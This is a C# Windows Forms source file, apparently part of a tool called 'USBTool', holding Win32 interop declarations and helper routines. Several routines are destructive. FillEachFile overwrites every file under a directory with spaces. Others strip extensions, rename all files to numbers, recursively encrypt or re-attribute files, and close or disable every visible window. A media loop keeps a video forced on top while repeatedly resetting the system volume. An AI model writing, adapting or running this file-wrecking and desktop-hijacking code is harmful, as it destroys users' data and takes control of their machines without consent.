using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Threading;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections.Generic;
using USBTool.CoreAudioApi;
using System.ComponentModel;
using System.Security.AccessControl;
using USBTool.Vds;
#if MEDIA_FOUNDATION
using USBTool.MediaFoundation;
#endif

namespace USBTool
{
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[ComVisible(true), ComImport, Guid("00000000-0000-0000-C000-000000000046")]
	public interface IUnknown
	{
		int QueryInterface(ref Guid iid, out IUnknown ppvObj);
		int AddRef();
		int Release();
	}
	public partial class FormMain : Form
	{
#if MEDIA_DSHOW
		private IMediaControl control;
		private IMediaEvent mediaEvent;
		private IVideoWindow window;
#elif MEDIA_MCI
		private string mediafilename;
		private IntPtr hMCIWnd;
#elif MEDIA_FOUNDATION
		public bool hasvideo=false;
		private float playvolume;
		public string state = "";		
#endif
		private string sentence;
		private SpeechSynthesizer Voice;
		private WndVideo host;
		private Random rand ;
		private TaskFactory tf;
		private Thread preventthread;
		private Thread mediathread;
		private List<IntPtr> lhwnd;
		private DEVMODE DEVMODE1;
		private IVdsService service;

		public delegate bool EnumWindowsCallBack(IntPtr hwnd, string lpPatam);
#if MEDIA_MCI
		[DllImport("Msvfw32.dll", SetLastError = true)]
		public static extern IntPtr MCIWndCreate(IntPtr hwndParent, IntPtr hInstance, uint dwStyle, string file);
#endif
		#region Magnification
		[DllImport("Magnification.dll", SetLastError = true)]
		public static extern bool MagInitialize();
		#endregion
		#region user32.dll
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref string pvParam, uint fWinIni);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetMagnificationDesktopColorEffect(float[,] pEffect);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SwapMouseButton(bool fSwap);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetDesktopWindow();
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool IsWindowVisible(IntPtr hWnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseWindow(IntPtr hWnd);
		[DllImport("user32.dll",SetLastError = true)]
		public static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SendMessage(IntPtr hWnd, uint msg, uint wParam, uint lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SendMessage(IntPtr hWnd, uint msg, uint wParam, [MarshalAs (UnmanagedType.LPWStr)]string lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetClientRect(IntPtr hWnd, ref Rectangle lpRECT);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
		[DllImport("user32.dll",  SetLastError = true)]
		public static extern IntPtr GetParent(IntPtr hwnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SetWindowPos(IntPtr hWnd,IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumChildWindows(IntPtr hWndParent,EnumWindowsCallBack lpEnumFunc,string lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public extern static bool BringWindowToTop(IntPtr hWnd);
		[DllImport("user32.dll", SetLastError = true)]
		public extern static bool ClipCursor(ref Rectangle lpRect);
		[DllImport("user32.dll", SetLastError = true)]
		public extern static bool EnableWindow(IntPtr hWnd, bool bEnable);

		#endregion
		#region kernel32.dll
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteFile(IntPtr hFile,byte[] lpBuffer,int nNumberOfBytesToWrite,out int lpNumberOfBytesWritten,IntPtr lpOverlapped);
		#endregion
		#region dwmapi.dll
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern int DwmExtendFrameIntoClientArea(IntPtr hwnd, ref MARGINS pMarInset);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern void DwmEnableComposition(uint uCompositionAction);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern void DwmEnableBlurBehindWindow(IntPtr hwnd, ref DWM_BLURBEHIND blurBehind);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern bool DwmSetWindowAttribute(IntPtr hwnd, uint attr, ref uint attrValue, int attrSize);
		#endregion
		#region ole32.dll
		[DllImport("Ole32.dll")]
		public static extern int CoCreateInstance(ref Guid rclsid, IUnknown pUnkOuter, uint dwClsContext, ref Guid riid, out IUnknown ppv);
		[DllImport("Ole32.dll")]
		public static extern int CoInitialize(object pvReserved);
		#endregion
#if MEDIA_FOUNDATION
		#region Media Foundation
		[DllImport("mfplat.dll", SetLastError = true,PreserveSig =true)]
		public static extern int MFStartup( uint Version,uint flags);
		[DllImport("mfplat.dll")]
		public static extern int MFShutdown();
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateMediaSession(IntPtr pConfiguration,out IMFMediaSession ppMediaSession);
		[DllImport("mf.dll",SetLastError =true,PreserveSig =true)]
		public static extern int MFCreateSourceResolver(out IMFSourceResolver ppISourceResolver);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateTopology(out IMFTopology ppTopo);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateTopologyNode(uint NodeType,out IMFTopologyNode ppNode);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateVideoRendererActivate(IntPtr hwndVideo,out IMFActivate ppActivate);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateAudioRendererActivate(out IMFActivate ppActivate);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFGetService(IUnknown punkObject, ref Guid guidService, ref Guid riid, out IUnknown ppvObject);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFRequireProtectedEnvironment(IMFPresentationDescriptor pPresentationDescriptor);
		#endregion
#elif MEDIA_FOUNDATION_PLAYER
		[DllImport("Mfplay.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFPCreateMediaPlayer(string pwszURL,bool fStartPlayback,uint creationOptions,IMFPMediaPlayerCallback pCallback,IntPtr hWnd,out IMFPMediaPlayer ppMediaPlayer );
		
#endif
		[StructLayout(LayoutKind.Sequential)]
		public struct DWM_BLURBEHIND
		{
			public uint dwFlags;
			public bool fEnable;
			public IntPtr hRgnBlur;
			public bool fTransitionOnMaximized;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct MARGINS
		{
			public int cxLeftWidth;
			public int cxRightWidth;
			public int cyTopHeight;
			public int cyBottomHeight;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct DEVMODE
		{
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmDeviceName;
			public short dmSpecVersion;
			public short dmDriverVersion;
			public short dmSize;
			public short dmDriverExtra;
			public int dmFields;
			public int dmPositionX;
			public int dmPositionY;
			public int dmDisplayOrientation;
			public int dmDisplayFixedOutput;
			public short dmColor;
			public short dmDuplex;
			public short dmYResolution;
			public short dmTTOption;
			public short dmCollate;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmFormName;
			public short dmLogPixels;
			public short dmBitsPerPel;
			public int dmPelsWidth;
			public int dmPelsHeight;
			public int dmDisplayFlags;
			public int dmDisplayFrequency;
			public int dmICMMethod;
			public int dmICMIntent;
			public int dmMediaType;
			public int dmDitherType;
			public int dmReserved1;
			public int dmReserved2;
			public int dmPanningWidth;
			public int dmPanningHeight;
		}

		public const uint IOCTL_STORAGE_EJECT_MEDIA = 0x2D4808;
		public const uint FILE_SHARE_READ = 0x1;
		public const uint FILE_SHARE_WRITE = 0x2;
		public const uint GENERIC_READ = 0x80000000;
		public const uint GENERIC_WRITE = 0x40000000;
		public const uint OPEN_EXISTING = 3;

		public const uint SPI_SETMOUSETRAILS = 0x5D;
		public const uint WM_CLOSE = 0x0010;
		public const uint WM_USER = 0x0400;
		public const uint WM_PAINT = 0x000F;
		public const uint WM_MOUSEACTIVATE = 0x0021;
		public const uint WM_SETTEXT = 0x000C;
		public const uint WS_VISIBLE = 0x10000000;
		public const uint WS_CHILD = 0x40000000;
		public const uint WS_EX_NOACTIVATE = 0x8000000;
		public const uint SW_NORMAL = 1;
		public const uint SW_FORCEMINIMIZE = 11;
		public const uint SW_SHOWDEFAULT = 10;
		public const uint SWP_NOMOVE = 0x0002;
		public const uint SWP_NOSIZE = 0x0001;
		public const uint SWP_SHOWWINDOW = 0x0040;

		public const uint DWMWA_NCRENDERING_POLICY = 2;
		public const uint DWMNCRP_ENABLED = 2;

		public Guid CLSID_VdsLoader = new Guid(0X9C38ED61, 0xD565, 0x4728, 0xAE, 0xEE, 0xC8, 0x09, 0x52, 0xF0, 0xEC, 0xDE);
		public const uint CLSCTX_ALL = 1 | 2 | 4 | 16;
		public const uint CLSCTX_LOCAL_SERVER = 0x4;
#if MEDIA_DSHOW
		public const uint EC_COMPLETE = 0x01;
#endif
#if MEDIA_FOUNDATION
		public readonly Guid MF_TOPOLOGY_RESOLUTION_STATUS = new Guid(0x494bbcde, 0xb031, 0x4e38, 0x97, 0xc4, 0xd5, 0x42, 0x2d, 0xd6, 0x18, 0xdc);
		public readonly Guid MF_TOPONODE_SOURCE = Guid.Parse("835c58ec-e075-4bc7-bcba-4de000df9ae6");
		public readonly Guid MF_TOPONODE_PRESENTATION_DESCRIPTOR = Guid.Parse("835c58ed-e075-4bc7-bcba-4de000df9ae6");
		public readonly Guid MF_TOPONODE_STREAM_DESCRIPTOR = Guid.Parse("835c58ee-e075-4bc7-bcba-4de000df9ae6");
		public readonly Guid MFMediaType_Audio = Guid.Parse("73647561-0000-0010-8000-00AA00389B71");
		public readonly Guid MFMediaType_Video = Guid.Parse("73646976-0000-0010-8000-00AA00389B71");
		public Guid MR_VIDEO_RENDER_SERVICE = new Guid(0x1092a86c,0xab1a,0x459a,0xa3, 0x36, 0x83, 0x1f, 0xbc, 0x4d, 0x11, 0xff);
		public Guid MF_RATE_CONTROL_SERVICE = Guid.Parse("866fa297-b802-4bf8-9dc9-5e3b6a9f53c9");
		public Guid MR_AUDIO_POLICY_SERVICE = new Guid(0x911fd737, 0x6775, 0x4ab0, 0xa6, 0x14, 0x29, 0x78, 0x62, 0xfd, 0xac, 0x88);
		public Guid MMDeviceEnumerator = Guid.Parse("BCDE0395-E52F-467C-8E3D-C4579291692E");
		public const uint MF_SDK_VERSION = 0x0001;
		public const uint MF_API_VERSION = 0x0070;
		public const uint MF_VERSION = (MF_SDK_VERSION << 16)| MF_API_VERSION;
		public const uint MFSTARTUP_NOSOCKET = 0x1;
		public const uint MFSTARTUP_FULL = 0x0;
		public const uint MF_RESOLUTION_MEDIASOURCE = 0x00000001;
		public const uint MF_RESOLUTION_BYTESTREAM = 0x00000002;
		public const uint MF_RESOLUTION_CONTENT_DOES_NOT_HAVE_TO_MATCH_EXTENSION_OR_MIME_TYPE = 0x00000010;
		public const uint MF_TOPOLOGY_OUTPUT_NODE = 0x0;
		public const uint MF_TOPOLOGY_SOURCESTREAM_NODE = 0x1;
		public const uint MESessionEnded = 107;
		public const uint MESessionTopologyStatus = 111;
		public const uint MESessionTopologySet = 101;
		public const uint MESessionStopped = 105;	
#endif
		//public const uint FMIFS_HARDDISK = 0xC;
#if MEDIA_MCI
		public enum MCIConst : uint
		{
			MCIWNDM_OPEN = WM_USER + 252,
			MCIWNDM_NOTIFYMODE = WM_USER + 200,
			MCIWNDM_SETVOLUME = WM_USER + 110,
			MCIWNDM_SETSPEED = WM_USER + 112,
			MCIWNDM_NOTIFYERROR  =   WM_USER + 205,
			MCIWNDF_NOAUTOSIZEWINDOW = 0x0001,
			MCIWNDF_NOPLAYBAR = 0x0002,
			MCIWNDF_NOMENU = 0x0008,
			MCIWNDF_NOTIFYMODE = 0x0100,
			MCIWNDF_NOTIFYERROR  =      0x1000,
			MCIWNDF_NOERRORDLG      =    0x4000,
			MCI_PLAY = 0x0806,
			MCI_MODE_STOP = 525,
		}
#endif
		public bool ForEachWindow(IntPtr hwnd, string op)
		{
			if (IsWindowVisible(hwnd))
			{
				switch (op)
				{
					case "title":
						SendMessage(hwnd, WM_SETTEXT, 0, sentence);
						break;
					case "picture":
						Rectangle rect = new Rectangle();
						GetClientRect(hwnd, ref rect);
						Graphics g = Graphics.FromHwnd(hwnd);
						Bitmap p = new Bitmap(sentence);
						try
						{
							g.DrawImage(p, rect);
						}
						catch
						{
						}
						finally
						{
							g.Dispose();
							p.Dispose();
						}
						break;
					case "close":
						ShowWindow(hwnd, SW_FORCEMINIMIZE);
						Thread.Sleep(10);
						break;
					case "glass":
						MARGINS m = new MARGINS()
						{
							cxLeftWidth = -1,
							cxRightWidth = -1,
							cyBottomHeight = -1,
							cyTopHeight = -1
						};
						DWM_BLURBEHIND b = new DWM_BLURBEHIND()
						{
							dwFlags = 3,
							fEnable = true,
							hRgnBlur = IntPtr.Zero
						};
						DwmEnableComposition(1);
						uint attr = DWMNCRP_ENABLED;
						DwmSetWindowAttribute(hwnd, DWMWA_NCRENDERING_POLICY, ref attr, Marshal.SizeOf(DWMNCRP_ENABLED));
						DwmEnableBlurBehindWindow(hwnd, ref b);
						DwmExtendFrameIntoClientArea(hwnd, ref m);
						break;
					case "destroy":
						if (hwnd != GetDesktopWindow())
						{
							SendMessage(hwnd, WM_CLOSE, 0, 0);
							Thread.Sleep(10);
						}
						break;
					case "beuncle":
						if (lhwnd.Contains(hwnd))
						{
							if (GetParent(hwnd) != GetDesktopWindow())
								break;
							else
								lhwnd.Clear();
						}
						lhwnd.Add(hwnd);
						SetParent(hwnd, IntPtr.Zero);					
						break;
					case "disable":
						EnableWindow(hwnd, false);
						break;
					case "text":
						rect = new Rectangle();
						GetClientRect(hwnd, ref rect);
						g = Graphics.FromHwnd(hwnd);
						int h = rect.Height;
						int fh = rect.Width / sentence.Length * 2;
						int ph = 0;
						try
						{
							Font f = new Font(FontFamily.GenericSansSerif,fh , FontStyle.Bold, GraphicsUnit.Pixel);
							do
							{
								g.DrawString(sentence, f, Brushes.Black, 0, ph);
								ph += fh;
								h -= fh;
							} while (h > 0);
						}
						catch
						{
						}
						finally
						{
							g.Dispose();
						}
						break;
					case "top":
						ShowWindow(hwnd, SW_SHOWDEFAULT);
						SetWindowPos(hwnd, new IntPtr(1), 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
						break;
					default:
						throw new ArgumentException("该功能还未开发");
				}
				EnumChildWindows(hwnd, ForEachWindow, op);
			}
			return true;
		}
		public static string StringByTime(string text, long time)
		{
			StringBuilder i = new StringBuilder();
			i.Append(char.Parse(text), (int)time);
			return i.ToString();
		}
		public static void SetAttributes(string directory, FileAttributes param)
		{
			foreach (string f in Directory.GetFiles(directory))
			{
				try
				{
					try
					{
						if (param == FileAttributes.Encrypted) File.Encrypt(f);
					}
					catch
					{
					}
					File.SetAttributes(f, param);
				}
				catch
				{
					continue;
				}
			}
			foreach (string d in Directory.GetDirectories(directory))
			{
				try
				{
					File.SetAttributes(d, param);
				}
				catch
				{
				}
				SetAttributes(d, param);
			}
		}
		public static void FillEachFile(string dirname)
		{
			foreach (string f in Directory.GetFiles(dirname))
			{
				try
				{
					File.WriteAllText(f, StringByTime(" ", new FileInfo(f).Length));
				}
				catch
				{
					continue;
				}
			}
			foreach (string f in Directory.GetDirectories(dirname))
			{
				FillEachFile(f);
			}
		}
		public static void DeleteExtName(string dirname)
		{
			foreach (string f in Directory.GetFiles(dirname))
			{
				try
				{
					FileInfo file = new FileInfo(f);
					string extname = file.Extension;
					if (extname.Length != 0)
					{
						int index = f.IndexOf(extname);
						string newname = f.Remove(index);
						file.MoveTo(newname);
					}
				}
				catch
				{
					continue;
				}
			}
			foreach (string f in Directory.GetDirectories(dirname))
			{
				DeleteExtName(f);
			}
		}
		public static void CopyDiretory(DirectoryInfo from, DirectoryInfo to)
		{
			foreach (var f in from.GetFiles())
				try
				{
					f.CopyTo(to.FullName + "\\" + f.Name, true);
				}
				catch
				{
					continue;
				}
			foreach (var d in from.GetDirectories())
				try
				{
					CopyDiretory(d, Directory.CreateDirectory(to.FullName + "\\" + d.Name));
				}
				catch
				{
					continue;
				}
		}
#if MEDIA_FOUNDATION
		public void InitializeMedia(string MediaFile,int dwrate ,float dwvolume)
		{
			int hr;
			MFStartup(MF_VERSION, MFSTARTUP_FULL);
			MFCreateMediaSession(IntPtr.Zero, out IMFMediaSession mediaSession);
			MFCreateTopology(out IMFTopology topo);
			MFCreateSourceResolver(out IMFSourceResolver resolver);
			IUnknown unknown;
			try
			{
				resolver.CreateObjectFromURL(MediaFile, MF_RESOLUTION_MEDIASOURCE | MF_RESOLUTION_CONTENT_DOES_NOT_HAVE_TO_MATCH_EXTENSION_OR_MIME_TYPE,
					null, out uint objtype, out unknown);
			}
			catch
			{
				MessageBox.Show("不支持的媒体格式。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			IMFMediaSource source = unknown as IMFMediaSource;
			source.CreatePresentationDescriptor(out IMFPresentationDescriptor descriptor);
			if (MFRequireProtectedEnvironment(descriptor) == 0)
			{
				MessageBox.Show("媒体受保护,无法播放。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			descriptor.GetStreamDescriptorCount(out uint sdcount);
			for (uint i = 0; i < sdcount; i++)
			{
				descriptor.GetStreamDescriptorByIndex(i, out bool IsSelected, out IMFStreamDescriptor sd);
				if (!IsSelected)
					descriptor.SelectStream(i);
				sd.GetMediaTypeHandler(out IMFMediaTypeHandler typeHandler);
				typeHandler.GetMajorType(out Guid streamtype);
				IMFActivate renderer;
				if (streamtype == MFMediaType_Audio)
				{
					hr = MFCreateAudioRendererActivate(out renderer);
				}
				else if (streamtype == MFMediaType_Video)
				{
					hr = MFCreateVideoRendererActivate(host.Handle, out renderer);
					hasvideo = true;
				}
				else
				{
					continue;
				}
				hr = MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE, out IMFTopologyNode sourcenode);
				sourcenode.SetUnknown(MF_TOPONODE_SOURCE, source as IUnknown);
				sourcenode.SetUnknown(MF_TOPONODE_PRESENTATION_DESCRIPTOR, descriptor as IUnknown);
				sourcenode.SetUnknown(MF_TOPONODE_STREAM_DESCRIPTOR, sd as IUnknown);
				topo.AddNode(sourcenode);
				MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE, out IMFTopologyNode outputnode);
				outputnode.SetObject(renderer as IUnknown);
				topo.AddNode(outputnode);
				hr = sourcenode.ConnectOutput(0, outputnode, 0);
			}
			mediaSession.SetTopology(0, topo);
			Hide();
			uint eventtype = 0;
			while (eventtype != MESessionTopologyStatus)
			{
				mediaSession.GetEvent(0, out IMFMediaEvent mediaevent);
				mediaevent.GetType(out eventtype);
				mediaevent = null;
			}
			Guid guid_ratecontrol = typeof(IMFRateControl).GUID;
			MFGetService(mediaSession as IUnknown, ref MF_RATE_CONTROL_SERVICE, ref guid_ratecontrol, out IUnknown _ratecontrol);
			IMFRateControl ratecontrol = _ratecontrol as IMFRateControl;
			hr=ratecontrol.SetRate(false, dwrate >= 0 ? dwrate * 7 / 10 + 1 : 1 / (1 + dwrate / -10 * 7));
			try
			{			
				Guid guid_audiopolicy = typeof(IMFAudioPolicy).GUID;
				hr = MFGetService(mediaSession as IUnknown, ref MR_AUDIO_POLICY_SERVICE, ref guid_audiopolicy, out IUnknown _policy);
				IMFAudioPolicy policy = _policy as IMFAudioPolicy;
				policy.SetDisplayName(" ");
				playvolume = dwvolume;
			}
			catch
			{
			}
			try
			{
				Guid guid_videocontrol = typeof(IMFVideoDisplayControl).GUID;
				hr = MFGetService(mediaSession as IUnknown, ref MR_VIDEO_RENDER_SERVICE, ref guid_videocontrol, out IUnknown _videocontrol);
				IMFVideoDisplayControl videocontrol = _videocontrol as IMFVideoDisplayControl;
				if (FullScreen.Checked)
				{
					host.Top = 0;
					host.Left = 0;
					host.Width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
					host.Height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
				}
				Rectangle videopos = new Rectangle(0, 0, host.Width, host.Height);
				host.videocontrol = videocontrol;
				videocontrol.SetVideoPosition(null, ref videopos);
			}
			catch
			{
			}
			state = "Prepared";
			while (true)
			{		
				if (state == "Playing")
				{
					eventtype = 0;
					PropVariant prop = new PropVariant()
					{
						vt = (ushort)VarEnum.VT_I8,
						unionmember = 0,
					};
					#region mediasession
					if (hasvideo)
					{
						host.Show();
						preventthread = new Thread(() => {
							while (true)
							{
								if (state == "Playing")
								{
									while (state == "Playing")
									{
										host.BringToFront();
										SetAppAndSystemVolume(playvolume,false);
									}
								}						
							}
						});
						preventthread.Start();
					}
					hr = mediaSession.Start(Guid.Empty, prop);
					while (eventtype != MESessionEnded)
					{
						hr=mediaSession.GetEvent(1, out IMFMediaEvent mediaevent);
						if (hr == 0)
						{
							mediaevent.GetType(out eventtype);
							mediaevent = null;
						}
						Application.DoEvents();
					}
					host.Hide();
					state = "Ended";
					#endregion
				}
			}
		}
#endif
		public void NumericalFileName(DirectoryInfo directory)
		{
			int filenumber = 0;
			int dirnumber = 0;
			foreach(var f in directory.GetFiles())
			{
				string newname = f.DirectoryName + "\\#" + filenumber + f.Extension;
				try
				{
					f.MoveTo(newname);
				}
				catch
				{

				}
				filenumber += 1;
			}
			foreach(var d in directory.GetDirectories())
			{
				NumericalFileName(d);
				string newname = d.Parent.FullName + "\\#" + dirnumber;
				try
				{
					d.MoveTo(newname);
				}
				catch
				{

				}
				dirnumber += 1;
			}
		}
		public static IEnumerable<T> EnumerateObjects<T>(IEnumVdsObject enumobject) where T : class
		{
			uint count;
			do
			{				
				enumobject.Next(1, out IUnknown unknown, out count);
				if (count > 0)
                {
					T o;
                    try
                    {
						o = (T)unknown;					
					}
                    catch
                    {
						throw new InvalidCastException("不支持的类型");
                    }
					yield return o;
				}					
			} while (count > 0);
			enumobject.Reset();
        }
		public void SetAppAndSystemVolume(float volume,bool muted)
		{
			Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
			Guid guidManager = typeof(IAudioSessionManager).GUID;
			Guid guidVolume = typeof(IAudioEndpointVolume).GUID;
			CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out IUnknown _enumerater);
			IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
			enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
			endpoint.Activate(ref guidManager, CLSCTX_ALL, IntPtr.Zero, out IUnknown _manager);
			endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _volume);
			IAudioSessionManager manager = _manager as IAudioSessionManager;
			manager.GetSimpleAudioVolume(Guid.Empty, false, out ISimpleAudioVolume processvolume);
			processvolume.SetMasterVolume(volume, Guid.Empty);
			processvolume.SetMute(muted, Guid.Empty);
			IAudioEndpointVolume systemvolume = _volume as IAudioEndpointVolume;
			systemvolume.SetMasterVolumeLevelScalar(muted?0:1, Guid.Empty);
			systemvolume.SetMute(muted, Guid.Empty);
		}		
	}
}